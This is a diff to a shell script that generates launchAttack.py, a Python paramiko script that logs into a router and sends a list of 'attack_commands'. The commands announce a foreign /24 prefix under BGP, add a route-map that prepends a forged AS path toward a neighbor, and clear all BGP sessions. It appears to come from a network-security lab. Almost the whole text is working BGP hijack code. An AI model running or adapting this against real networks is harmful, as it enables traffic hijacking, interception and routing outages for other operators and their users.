@@ -22,10 +22,10 @@ printf "import paramiko \nfrom getpass import getpass \nimport time \
 \nremote_conn = remote_conn_pre.invoke_shell() \
 \noutput = remote_conn.recv(65535) \
 \nprint(output.decode(\"utf-8\")) \
-\nattack_commands = [\'vtysh\ \bn\', \'conf t\ \bn\', \'router bgp 8\ \bn\', \'network 200.7.0.0/24\ \bn\', \'ip route 200.7.0.0 255.255.255.0 216.239.32.1\ \bn\', \'access-list 10 permit 200.7.0.0 255.255.255.0\ \bn\', \'route-map toMY-ISP permit 10\ \bn\', \'match ip address 10\ \bn\', \'set as-path prepend 5 1 2\ \bn\', \'exit\ \bn\', \'router bgp 8\ \bn\', \'neighbor 216.239.32.1 route-map toMY-ISP out\ \bn\', \'exit\ \bn\', \'do clear ip bgp *\ \bn\'] \
+\nattack_commands = [\'vtysh%s', \'conf t%s', \'router bgp 8%s', \'network 200.7.0.0/24%s', \'ip route 200.7.0.0 255.255.255.0 216.239.32.1%s', \'access-list 10 permit 200.7.0.0 255.255.255.0%s', \'route-map toMY-ISP permit 10%s', \'match ip address 10%s', \'set as-path prepend 8 5 1 2%s', \'exit%s', \'router bgp 8%s', \'neighbor 216.239.32.1 route-map toMY-ISP out%s', \'exit%s', \'do clear ip bgp *%s'] \
 \n
 \nfor attack_command in attack_commands: \
 \n    remote_conn.send(attack_command) \
 \n    time.sleep(.5) \
 \n    output = remote_conn.recv(65535) \
-\n    print(output.decode(\"utf-8\")) " >> launchAttack.py
+\n    print(output.decode(\"utf-8\")) " "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" >> launchAttack.py
